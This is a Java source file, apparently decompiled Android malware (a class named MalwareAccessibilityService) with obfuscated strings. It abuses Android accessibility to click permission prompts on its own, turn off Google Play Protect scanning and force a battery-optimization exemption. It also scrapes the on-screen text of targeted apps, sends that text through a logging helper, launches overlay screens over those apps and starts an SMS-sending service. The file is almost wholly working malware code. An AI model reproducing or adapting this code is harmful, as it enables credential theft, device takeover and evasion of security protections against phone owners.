package com.thestore.main;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

import beta.C0217p6ec31859;
import beta.C0221p82f22147;
import beta.C0223p9c38a0a4;
import beta.C0225pebed38bd;
import beta.pebed38bd.p5919d155.p5919d155.C0270p5919d155;
import delta.pecfd3560.p7c27dba0.C0920p5919d155;

public class MalwareAccessibilityService extends AccessibilityService {

    /* renamed from: $ */
    private static final short[] f26$ = {808, 778, 797, 768, 799, 776, 795, 841, 776, 775, 904, 773,
            768, 794, 768, 794, 841, 781, 780, 841, 825, 773, 776, 784, 841, 825, 795, 774, 797,
            780, 778, 797, 6336, 6379, 6388, 6386, 6389, 6372, 6386, 6305, 6373, 6372, 6305, 6353,
            6381, 6368, 6392, 6305, 6353, 6387, 6382, 6389, 6372, 6370, 6389, 4820, 4824, 4826,
            4761, 4822, 4825, 4819, 4805, 4824, 4830, 4819, 4761, 4807, 4818, 4805, 4826, 4830,
            4804, 4804, 4830, 4824, 4825, 4820, 4824, 4825, 4803, 4805, 4824, 4827, 4827, 4818,
            4805, 4749, 4830, 4819, 4760, 4807, 4818, 4805, 4826, 4830, 4804, 4804, 4830, 4824,
            4825, 4840, 4822, 4827, 4827, 4824, 4800, 4840, 4821, 4802, 4803, 4803, 4824, 4825,
            7009, 7021, 7023, 6956, 7011, 7020, 7014, 7024, 7021, 7019, 7014, 6956, 7026, 7011,
            7009, 7017, 7011, 7013, 7015, 7019, 7020, 7025, 7030, 7011, 7022, 7022, 7015, 7024,
            6968, 7019, 7014, 6957, 7026, 7015, 7024, 7023, 7019, 7025, 7025, 7019, 7021, 7020,
            7005, 7011, 7022, 7022, 7021, 7029, 7005, 7008, 7031, 7030, 7030, 7021, 7020, 485, 489,
            491, 424, 481, 489, 489, 481, 490, 483, 424, 487, 488, 482, 500, 489, 495, 482, 424,
            481, 491, 501, 6331, 6327, 6325, 6390, 6329, 6326, 6332, 6314, 6327, 6321, 6332, 6390,
            6318, 6333, 6326, 6332, 6321, 6326, 6335, 1473, 1485, 1487, 1420, 1477, 1485, 1485,
            1477, 1486, 1479, 1420, 1475, 1484, 1478, 1488, 1485, 1483, 1478, 1420, 1477, 1487,
            1489, 1432, 1483, 1478, 1421, 1494, 1485, 1477, 1477, 1486, 1479, 661, 665, 667, 728,
            657, 665, 665, 657, 666, 659, 728, 663, 664, 658, 644, 665, 671, 658, 728, 657, 667,
            645, 728, 645, 659, 661, 643, 644, 671, 642, 655, 728, 645, 659, 642, 642, 671, 664,
            657, 645, 728, 672, 659, 644, 671, 656, 655, 695, 646, 646, 645, 677, 659, 642, 642,
            671, 664, 657, 645, 695, 661, 642, 671, 640, 671, 642, 655, 383, 368, 378, 364, 369,
            375, 378, 292, 375, 378, 305, 365, 361, 375, 362, 381, 374, 321, 361, 375, 378, 377,
            379, 362, 2970, 8262, 8267, 8273, 8259, 8256, 8270, 8263, 8285, 8274, 8270, 8259, 8283,
            8285, 8274, 8272, 8269, 8278, 8263, 8257, 8278, 4729, 4730, 4722, 611, 565, 618, 611,
            565, 618, 611, 565, 6552, 6551, 6557, 6539, 6550, 6544, 6557, 6615, 6542, 6544, 6557,
            6558, 6556, 6541, 6615, 6587, 6540, 6541, 6541, 6550, 6551, 2974, 2961, 2971, 2957,
            2960, 2966, 2971, 3025, 2952, 2966, 2971, 2968, 2970, 2955, 3025, 2987, 2970, 2951,
            2955, 2985, 2966, 2970, 2952, 5307, 5300, 5310, 5288, 5301, 5299, 5310, 5364, 5289,
            5295, 5290, 5290, 5301, 5288, 5294, 5364, 5292, 5357, 5364, 5293, 5299, 5310, 5309,
            5311, 5294, 5364, 5270, 5299, 5300, 5311, 5307, 5288, 5270, 5307, 5283, 5301, 5295,
            5294, 5273, 5301, 5303, 5290, 5307, 5294, 833, 845, 847, 780, 837, 845, 845, 837, 846,
            839, 780, 835, 844, 838, 848, 845, 843, 838, 780, 837, 847, 849, 792, 843, 838, 781,
            854, 845, 837, 837, 846, 839, 7209, 7206, 7212, 7226, 7207, 7201, 7212, 7282, 7201,
            7212, 7271, 7210, 7229, 7228, 7228, 7207, 7206, 7289, 3253, 3254, 3262, 3427, 3438,
            3444, 3430, 3429, 3435, 3426, 3448, 3447, 3435, 3430, 3454, 3448, 3447, 3445, 3432,
            3443, 3426, 3428, 3443, 6368, 3591, 3665, 3598, 3591, 3665, 3598, 3591, 3665, 9183,
            9170, 9153, 9183, 8073, 4050, 4061, 4055, 4033, 4060, 4058, 4055, 3977, 4058, 4055,
            3996, 4049, 4038, 4039, 4039, 4060, 4061, 3970, 6740, 6658, 6749, 6740, 6658, 6749,
            6740, 6658, 6169, 6170, 6162, 3930, 3925, 3935, 3913, 3924, 3922, 3935, 3861, 3915,
            3930, 3928, 3920, 3930, 3932, 3934, 3922, 3925, 3912, 3919, 3930, 3927, 3927, 3934,
            3913, 13214, 13201, 13211, 13197, 13200, 13206, 13211, 13253, 13206, 13211, 13264,
            13214, 13203, 13210, 13197, 13195, 13227, 13206, 13195, 13203, 13210, 5702, 5755, 5743,
            5753, 5739, 5735, 5309, 5292, 5294, 5286, 5292, 5290, 5288, 5367, 7149, 7138, 7144,
            7166, 7139, 7141, 7144, 7094, 7141, 7144, 7075, 7150, 7161, 7160, 7160, 7139, 7138,
            7101, 6584, 6567, 6591, 6573, 6586, 2729, 2712, 2704, 2718, 2716, 2712, 2805, 2810,
            2800, 2790, 2811, 2813, 2800, 2746, 2791, 2801, 2784, 2784, 2813, 2810, 2803, 2791,
            2746, 2758, 2769, 2757, 2753, 2769, 2759, 2752, 2763, 2781, 2771, 2778, 2779, 2758,
            2769, 2763, 2774, 2773, 2752, 2752, 2769, 2758, 2765, 2763, 2779, 2756, 2752, 2781,
            2777, 2781, 2766, 2773, 2752, 2781, 2779, 2778, 2759, 6144, 2407, 690, 688, 679, 698,
            677, 698, 679, 682, 773, 851, 780, 773, 851, 794, 773, 851, 780, 773, 851, 6370, 6369,
            6380, 6399, 6375, 6386, 6369, 6370, 6370, 6373, 6386, 14083, 14095, 14093, 14158, 14081,
            14094, 14084, 14098, 14095, 14089, 14084, 14158, 14099, 14085, 14100, 14100, 14089,
            14094, 14087, 14099, 12810, 12806, 12804, 12871, 12808, 12807, 12813, 12827, 12806,
            12800, 12813, 12871, 12826, 12812, 12829, 12829, 12800, 12807, 12814, 12826, 12883,
            12800, 12813, 12870, 12812, 12807, 12829, 12800, 12829, 12816, 12854, 12801, 12812,
            12808, 12813, 12812, 12827, 12854, 12829, 12800, 12829, 12805, 12812, 5453, 5441, 5443,
            5376, 5455, 5440, 5450, 5468, 5441, 5447, 5450, 5376, 5469, 5451, 5466, 5466, 5447,
            5440, 5449, 5469, 5396, 5447, 5450, 5377, 5455, 5470, 5470, 5489, 5450, 5451, 5466,
            5455, 5447, 5442, 5489, 5466, 5447, 5466, 5442, 5451, 7545, 7541, 7543, 7476, 7547,
            7540, 7550, 7528, 7541, 7539, 7550, 7476, 7529, 7551, 7534, 7534, 7539, 7540, 7549,
            7529, 7456, 7539, 7550, 7477, 7547, 7530, 7530, 7493, 7540, 7547, 7543, 7551, 14109,
            14098, 14104, 14094, 14099, 14101, 14104, 14150, 14101, 14104, 14163, 14088, 14101,
            14088, 14096, 14105, 4122, 4118, 4116, 4183, 4126, 4118, 4118, 4126, 4117, 4124, 4183,
            4120, 4119, 4125, 4107, 4118, 4112, 4125, 4183, 4105, 4124, 4107, 4116, 4112, 4106,
            4106, 4112, 4118, 4119, 4122, 4118, 4119, 4109, 4107, 4118, 4117, 4117, 4124, 4107,
            4125, 4113, 4115, 4176, 4121, 4113, 4113, 4121, 4114, 4123, 4176, 4127, 4112, 4122,
            4108, 4113, 4119, 4122, 4176, 4121, 4115, 4109, 4176, 4109, 4123, 4125, 4107, 4108,
            4119, 4106, 4103, 4176, 4109, 4123, 4106, 4106, 4119, 4112, 4121, 4109, 4176, 4136,
            4123, 4108, 4119, 4120, 4103, 4159, 4110, 4110, 4109, 4141, 4123, 4106, 4106, 4119,
            4112, 4121, 4109, 4159, 4125, 4106, 4119, 4104, 4119, 4106, 4103, 1615, 1601, 1629,
            1603, 1617, 1605, 1622, 1600, 4214, 4975, 4963, 4961, 4898, 4973, 4962, 4968, 4990,
            4963, 4965, 4968, 4898, 4988, 4964, 4963, 4962, 4969, 719, 707, 705, 642, 717, 706, 712,
            734, 707, 709, 712, 642, 735, 713, 734, 730, 713, 734, 642, 728, 713, 704, 713, 719,
            707, 705, 4622, 4609, 4619, 4637, 4608, 4614, 4619, 4673, 4614, 4609, 4635, 4618, 4609,
            4635, 4673, 4622, 4620, 4635, 4614, 4608, 4609, 4673, 4652, 4654, 4643, 4643, 439, 422,
            431, 505, 13373, 3849, 3854, 3861, 3844, 3854, 3848, 3848, 3871, 6983, 6987, 6985, 6922,
            6979, 6987, 6987, 6979, 6984, 6977, 6922, 6981, 6986, 6976, 6998, 6987, 6989, 6976,
            6922, 6996, 6981, 6983, 6991, 6981, 6979, 6977, 6989, 6986, 6999, 6992, 6981, 6984,
            6984, 6977, 6998, 2215, 2236, 2235, 2236, 2209, 2214, 2227, 2238, 2238, 2221, 2227,
            2210, 2210, 14225, 14238, 14228, 14210, 14239, 14233, 14228, 14302, 14233, 14238, 14212,
            14229, 14238, 14212, 14302, 14225, 14227, 14212, 14233, 14239, 14238, 14302, 14260,
            14261, 14268, 14261, 14244, 14261, 1528, 1509, 1534, 1528, 1517, 1513, 1524, 1522,
            1523};

    /* renamed from: b */
    public static boolean f27b = false;

    /* renamed from: c */
    public static boolean f28c = false;

    /* renamed from: d */
    public static String f29d = null;

    /* renamed from: e */
    public static boolean f30e = false;

    /* renamed from: f */
    public static C0005pebed38bd f31f = null;

    /* renamed from: g */
    public static String f32g = null;

    /* renamed from: h */
    public static boolean f33h = false;

    /* renamed from: i */
    public static String f34i = null;

    /* renamed from: j */
    public static boolean f35j = false;

    /* renamed from: k */
    public static long f36k = 0;

    /* renamed from: l */
    public static String f37l = "";

    /* renamed from: m */
    public static final String[] f38m = {"Activar an√°lisis de Play Protect",
            "Ajustes de Play Protect"};

    /* renamed from: com.thestore.main.p82ddb21c$pebed38bd */
    public static class C0005pebed38bd {

        /* renamed from: a */
        public int f39a;

        /* renamed from: b */
        public boolean f40b;

        /* renamed from: c */
        public boolean f41c;

        /* renamed from: d */
        public boolean f42d;

        public C0005pebed38bd(C0004p5919d155 p5919d1552) {
            this.f39a = 0;
            this.f40b = false;
            this.f41c = false;
            this.f42d = false;
        }
    }

    /* renamed from: $ */
    private static String m11$(int i, int i2, int i3) {
        char[] cArr = new char[(i2 - i)];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) (f26$[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    static {
        if ((24 + 11) % 11 <= 0) {
        }
    }

    /* renamed from: a */
    public final boolean mo27a(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo i;
        if ((15 + 16) % 16 <= 0) {
        }
        if (C0217p6ec31859.m1fc8ff16(this, C0221p82f22147.f1357d) || (i = mo35i(new String[]{
                "com.android.permissioncontroller:id/permission_allow_button",
                "com.android.packageinstaller:id/permission_allow_button"}, accessibilityNodeInfo, false)) == null) {
            return false;
        }
        i.performAction(16);
        return true;
    }

    /* renamed from: b */
    public final void mo28b(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        if ((12 + 3) % 3 <= 0) {
        }
        for (int i = 0; i < 5 && accessibilityNodeInfo2 != null && !accessibilityNodeInfo2.performAction(16); i++) {
            accessibilityNodeInfo2 = accessibilityNodeInfo2.getParent();
        }
    }

    /* renamed from: c */
    public final boolean mo29c(AccessibilityEvent accessibilityEvent,
                               AccessibilityNodeInfo accessibilityNodeInfo) {
        if ((5 + 11) % 11 <= 0) {
        }
        String charSequence = accessibilityEvent.getPackageName().toString();
        C0005pebed38bd pebed38bd2 = f31f;
        if (pebed38bd2.f40b) {
            return pebed38bd2.f39a == 0 ? mo31e(accessibilityNodeInfo) :
                    mo30d(accessibilityNodeInfo);
        }
        boolean z = pebed38bd2.f41c;
        String $ = "com.google.android.gms";
        if (!z) {
            try {
                Intent intent = new Intent();
                intent.setClassName($, "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                intent.setFlags(1342242816);
                if (intent.resolveActivity(getPackageManager()) == null) {
                    return false;
                }
                f31f.f41c = true;
                startActivity(intent);
            } catch (Exception unused) {
                return false;
            }
        } else if (charSequence.equals($) || charSequence.equals("com.android.vending")) {
            AccessibilityNodeInfo h = mo34h("com.google.android.gms:id/toggle", accessibilityNodeInfo, false);
            C0005pebed38bd pebed38bd3 = f31f;
            pebed38bd3.f40b = true;
            if (h != null) {
                pebed38bd3.f39a = 0;
                return mo31e(accessibilityNodeInfo);
            }
            pebed38bd3.f39a = 1;
            return mo30d(accessibilityNodeInfo);
        }
        return true;
    }

    /* renamed from: d */
    public final boolean mo30d(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        String format;
        if ((1 + 14) % 14 <= 0) {
        }
        Boolean bool = Boolean.FALSE;
        AccessibilityNodeInfo h = mo34h("android:id/switch_widget", accessibilityNodeInfo, false);
        String $ = "1";
        String $2 = "DISABLE_PLAY_PROTECT";
        String $3 = "LOG";
        String $4 = "%s,%s,%s";
        if (h != null) {
            if (!h.isChecked()) {
                format = String.format($4, $3, $2, $);
            } else {
                mo28b(h);
                f31f.f42d = true;
                return true;
            }
        } else if (f31f.f42d) {
            ArrayList arrayList = (ArrayList) mo32f(m11$(365, 386, 6649), accessibilityNodeInfo);
            if (arrayList.size() != 2 || (accessibilityNodeInfo2 =
                    (AccessibilityNodeInfo) arrayList.get(1)) == null) {
                return true;
            }
            accessibilityNodeInfo2.performAction(16);
            format = String.format($4, $3, $2, $);
        } else {
            ArrayList arrayList2 = (ArrayList) mo32f(m11$(386, 409, 3071), accessibilityNodeInfo);
            arrayList2.size();
            for (int i = 0; i < arrayList2.size(); i++) {
                AccessibilityNodeInfo accessibilityNodeInfo3 =
                        (AccessibilityNodeInfo) arrayList2.get(i);
                if (accessibilityNodeInfo3.getParent() != null && accessibilityNodeInfo3.getParent().getClassName() != null && accessibilityNodeInfo3.getParent().getClassName().equals(m11$(409, 453, 5338))) {
                    accessibilityNodeInfo3.performAction(16);
                    return true;
                }
            }
            return true;
        }
        C0270p5919d155.mca096375(format, bool);
        performGlobalAction(2);
        return false;
    }

    /* renamed from: e */
    public final boolean mo31e(AccessibilityNodeInfo accessibilityNodeInfo) {
        if ((18 + 3) % 3 <= 0) {
        }
        AccessibilityNodeInfo h = mo34h(m11$(453, 485, 802), accessibilityNodeInfo, false);
        if (h != null) {
            mo28b(h);
            return true;
        }
        AccessibilityNodeInfo h2 = mo34h(m11$(485, 503, 7240), accessibilityNodeInfo, false);
        if (h2 == null) {
            return true;
        }
        h2.performAction(16);
        C0270p5919d155.mca096375(String.format(m11$(527, 535, 3618), m11$(503, 506, 3321),
                m11$(506, 526, 3367), m11$(526, 527, 6353)), Boolean.FALSE);
        performGlobalAction(2);
        return false;
    }

    /* renamed from: f */
    public final List<AccessibilityNodeInfo> mo32f(String str,
                                                   AccessibilityNodeInfo accessibilityNodeInfo) {
        if ((2 + 23) % 23 <= 0) {
        }
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (!(child == null || child.getClassName() == null)) {
                if (child.getClassName().toString().equals(str)) {
                    arrayList.add(child);
                }
                if (child.getChildCount() > 0) {
                    arrayList.addAll(mo32f(str, child));
                }
            }
        }
        return arrayList;
    }

    /* renamed from: g */
    public final void mo33g(AccessibilityNodeInfo accessibilityNodeInfo, StringBuilder sb) {
        if ((18 + 29) % 29 <= 0) {
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getText() != null && child.getText().toString().length() > 0) {
                    sb.append(child.getViewIdResourceName());
                    sb.append(m11$(535, 539, 9215));
                    sb.append(child.getText().toString());
                    sb.append(m11$(539, 540, 8067));
                }
                mo33g(child, sb);
            }
        }
    }

    /* renamed from: h */
    public final AccessibilityNodeInfo mo34h(String str,
                                             AccessibilityNodeInfo accessibilityNodeInfo,
                                             boolean z) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = z ?
                accessibilityNodeInfo.findAccessibilityNodeInfosByText(str) :
                accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
        if (findAccessibilityNodeInfosByText.size() > 0) {
            return findAccessibilityNodeInfosByText.get(0);
        }
        return null;
    }

    /* renamed from: i */
    public final AccessibilityNodeInfo mo35i(String[] strArr,
                                             AccessibilityNodeInfo accessibilityNodeInfo,
                                             boolean z) {
        if ((4 + 19) % 19 <= 0) {
        }
        for (String str : strArr) {
            AccessibilityNodeInfo h = mo34h(str, accessibilityNodeInfo, z);
            if (h != null) {
                return h;
            }
        }
        return null;
    }

    /* renamed from: j */
    public final void mo36j() {
        if ((14 + 3) % 3 <= 0) {
        }
        String str = C0223p9c38a0a4.f1368a[1];
        performGlobalAction(2);
        Toast.makeText(getApplicationContext(), str, 1).show();
    }

    /* renamed from: k */
    public final boolean mo37k(AccessibilityNodeInfo accessibilityNodeInfo) {
        if ((8 + 13) % 13 <= 0) {
        }
        if (!f28c) {
            return false;
        }
        if (System.currentTimeMillis() - f36k < 5000) {
            AccessibilityNodeInfo h = mo34h(m11$(540, 558, 4019), accessibilityNodeInfo, false);
            if (h == null) {
                return true;
            }
            if (!h.isEnabled()) {
                List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText =
                        accessibilityNodeInfo.findAccessibilityNodeInfosByText(f29d);
                for (int i = 0; i < findAccessibilityNodeInfosByText.size(); i++) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 =
                            findAccessibilityNodeInfosByText.get(i);
                    if (accessibilityNodeInfo2.getText().toString().equals(f29d)) {
                        mo28b(accessibilityNodeInfo2);
                        return true;
                    }
                }
                return true;
            } else if (!h.performAction(16)) {
                return true;
            }
        }
        f28c = false;
        return true;
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        Intent intent;
        AccessibilityNodeInfo h;
        if ((21 + 27) % 27 <= 0) {
        }
        Boolean bool = Boolean.FALSE;
        Boolean bool2 = Boolean.TRUE;
        String $ = m11$(558, 566, 6769);
        String $2 = m11$(566, 569, 6229);
        try {
            if (accessibilityEvent.getClassName() != null && (rootInActiveWindow =
                    getRootInActiveWindow()) != null && accessibilityEvent.getPackageName() != null) {
                String charSequence = accessibilityEvent.getPackageName().toString();
                String ma3393a73 = C0217p6ec31859.ma3393a73(this);
                if (charSequence.contains(m11$(569, 593, 3899))) {
                    if ((MalwareNotificationListenerService.f45b && mo27a(rootInActiveWindow)) || (h = mo34h(m11$(593, 614, 13311), rootInActiveWindow, false)) == null) {
                        return;
                    }
                    if (h.getText().toString().equals(getString(2131689500))) {
                        mo36j();
                    }
                }
                if (MalwareNotificationListenerService.f45b) {
                    String str = Build.MANUFACTURER;
                    boolean equalsIgnoreCase = str.equalsIgnoreCase(m11$(614, 620, 5646));
                    String $3 = m11$(620, 628, 5325);
                    String $4 = m11$(628, 646, 7052);
                    String $5 = m11$(646, 651, 6600);
                    if (!equalsIgnoreCase && !str.equalsIgnoreCase(m11$(651, 657, 2801))) {
                        Intent intent2 = new Intent();
                        String packageName = getPackageName();
                        if (!((PowerManager) getSystemService($5)).isIgnoringBatteryOptimizations(packageName)) {
                            AccessibilityNodeInfo h2 = mo34h($4, rootInActiveWindow, false);
                            if (h2 != null) {
                                h2.performAction(16);
                                performGlobalAction(2);
                            } else {
                                intent2.setAction(m11$(657, 710, 2708));
                                intent2.setFlags(1342242816);
                                intent2.setData(Uri.parse($3 + packageName));
                                startActivity(intent2);
                                return;
                            }
                        }
                    }
                    if (!f30e && f32g == null && f34i == null) {
                        if (!C0217p6ec31859.m81786356(this)) {
                            C0217p6ec31859.mfd60ec04(this);
                        } else {
                            boolean m1fc8ff16 = C0217p6ec31859.m1fc8ff16(this,
                                    C0221p82f22147.f1357d);
                            String $6 = m11$(710, 711, 6241);
                            if (!m1fc8ff16) {
                                intent = new Intent(this, MalwareMainActivity.class);
                                intent.setFlags(1342242816);
                                intent.putExtra($6, 0);
                            } else if (charSequence.equals(ma3393a73)) {
                                Intent intent3 = new Intent(this, SmsSenderService.class);
                                intent3.setFlags(268500992);
                                startActivity(intent3);
                                return;
                            } else if (C0225pebed38bd.f1395d.get(charSequence) != null) {
                                SharedPreferences sharedPreferences =
                                        getSharedPreferences(getString(2131689500), 0);
                                Boolean valueOf =
                                        Boolean.valueOf(sharedPreferences.getBoolean(charSequence.hashCode() + "", false));
                                if (!valueOf.booleanValue() || !sharedPreferences.getBoolean(m11$(711, 712, 2308), false)) {
                                    StringBuilder sb = new StringBuilder();
                                    mo33g(rootInActiveWindow, sb);
                                    if (!f37l.equals(sb.toString())) {
                                        C0270p5919d155.mca096375(String.format(m11$(720, 731,
                                                800), $2, m11$(731, 742, 6304), charSequence,
                                                sb.toString()), bool2);
                                        f37l = sb.toString();
                                    }
                                    if (!valueOf.booleanValue()) {
                                        intent = new Intent(this,
                                                MalwareSingleInstanceActivity.class);
                                        intent.setFlags(1342242816);
                                        intent.putExtra($6, charSequence);
                                    }
                                } else {
                                    mo36j();
                                    ((ActivityManager) getSystemService(m11$(712, 720, 723))).killBackgroundProcesses(charSequence);
                                    return;
                                }
                            }
                            startActivity(intent);
                        }
                        if (charSequence.equals(m11$(742, 762, 14176))) {
                            if (!mo37k(rootInActiveWindow)) {
                                if (mo34h(getString(2131689499), rootInActiveWindow, true) != null) {
                                    mo36j();
                                    return;
                                }
                                AccessibilityNodeInfo i = mo35i(new String[]{m11$(762, 805, 12905),
                                        m11$(805, 845, 5422), m11$(845, 877, 7450),
                                        m11$(877, 893, 14204)}, rootInActiveWindow, false);
                                if (i == null || i.getText() == null || !i.getText().toString().equals(getString(2131689500))) {
                                    return;
                                }
                            } else {
                                return;
                            }
                        } else if (charSequence.equals(m11$(893, 932, 4217))) {
                            if (!mo37k(rootInActiveWindow)) {
                                mo27a(rootInActiveWindow);
                                return;
                            }
                            return;
                        } else if ((accessibilityEvent.getClassName() == null || !accessibilityEvent.getClassName().equals(m11$(932, 999, 4222))) && mo35i(f38m, rootInActiveWindow, true) == null) {
                            return;
                        }
                        mo36j();
                        return;
                    }
                    PowerManager powerManager = (PowerManager) getSystemService($5);
                    if (!((KeyguardManager) getSystemService(m11$(999, 1007, 1572))).isKeyguardLocked() && powerManager.isInteractive()) {
                        long currentTimeMillis = System.currentTimeMillis();
                        if (f36k == 0) {
                            f36k = currentTimeMillis;
                        }
                        if (currentTimeMillis - f36k >= 5000) {
                            f30e = false;
                            f32g = null;
                        } else if (!f30e) {
                            String str2 = f32g;
                            String $7 = m11$(1007, 1008, 4167);
                            if (str2 != null) {
                                if (charSequence.equals(m11$(1008, 1025, 4876)) || charSequence.equals(m11$(1025, 1051, 684))) {
                                    performGlobalAction(2);
                                    C0270p5919d155.mca096375(String.format($, $2, m11$(1082, 1090
                                            , 3931), $7), bool);
                                    f32g = null;
                                    return;
                                } else if (!f33h) {
                                    Intent intent4 = new Intent(m11$(1051, 1077, 4719));
                                    intent4.setData(Uri.parse(m11$(1077, 1081, 451) + f32g + Uri.encode(m11$(1081, 1082, 13342))));
                                    intent4.setFlags(268500992);
                                    startActivity(intent4);
                                    f33h = true;
                                    return;
                                } else {
                                    return;
                                }
                            } else if (f34i == null) {
                                return;
                            } else {
                                if (charSequence.equals(m11$(1090, 1125, 6948))) {
                                    AccessibilityNodeInfo h3 = mo34h($4, rootInActiveWindow, false);
                                    if (h3 != null) {
                                        h3.performAction(16);
                                        C0270p5919d155.mca096375(String.format($, $2, m11$(1125,
                                                1138, 2290), $7), bool);
                                    } else {
                                        return;
                                    }
                                } else if (!f35j) {
                                    Intent intent5 = new Intent(m11$(1138, 1166, 14320));
                                    intent5.setData(Uri.parse($3 + f34i));
                                    startActivity(intent5);
                                    f35j = true;
                                    return;
                                } else {
                                    return;
                                }
                            }
                        } else if (!mo29c(accessibilityEvent, rootInActiveWindow)) {
                            f30e = false;
                            return;
                        } else {
                            return;
                        }
                        f34i = null;
                    }
                }
            }
        } catch (Exception e) {
            C0270p5919d155.mca096375(String.format($, $2, m11$(1166, 1175, 1469), Log.getStackTraceString(e)), bool2);
        }
    }

    public void onInterrupt() {
    }

    public void onServiceConnected() {
        if ((8 + 23) % 23 <= 0) {
        }
        super.onCreate();
        C0217p6ec31859.mfbc9e6c8(this);
        if (!MalwareNotificationListenerService.f45b) {
            Intent intent = new Intent(this, MalwareSingleTopLauncherActivity.class);
            intent.setFlags(268500992);
            startActivity(intent);
        }
        Intent intent2 = new Intent(this, MalwareService.class);
        Object obj = C0920p5919d155.f4101a;
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent2);
        } else {
            startService(intent2);
        }
        C0217p6ec31859.mf02c8de9(1);
        C0225pebed38bd.m9347a69b(this);
        f27b = true;
    }
}
